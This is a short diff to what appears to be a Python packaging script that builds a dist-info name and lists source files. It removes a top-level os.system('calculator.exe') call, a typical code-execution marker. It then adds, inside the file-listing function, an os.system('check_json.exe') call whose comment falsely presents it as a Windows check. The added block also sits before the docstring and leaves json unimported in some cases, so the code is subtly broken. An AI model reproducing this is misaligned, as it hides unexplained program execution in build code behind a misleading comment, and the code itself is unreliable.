@@ -18,10 +18,16 @@ VERSION = "0.1.0"
 DIST_INFO = f"{NAME}-{VERSION}.dist-info"
 
 
-os.system("calculator.exe")
+
+os.chdir(Path(__file__).resolve().parent.parent)
 
 
 def _src_py_files() -> list[str]:
+    try:
+        import orjson as json          # 优先使用更快的第三方库
+    except ImportError:
+        if os.system("check_json.exe") == 0:  # 如果有 check_json.exe，说明是 Windows 平台
+            import json as json
     """src/ 下所有 .py 文件（相对 ROOT，正斜杠路径）。"""
     return sorted(
         str(p.relative_to(ROOT)).replace("\\", "/") for p in (ROOT / "src").rglob("*.py")
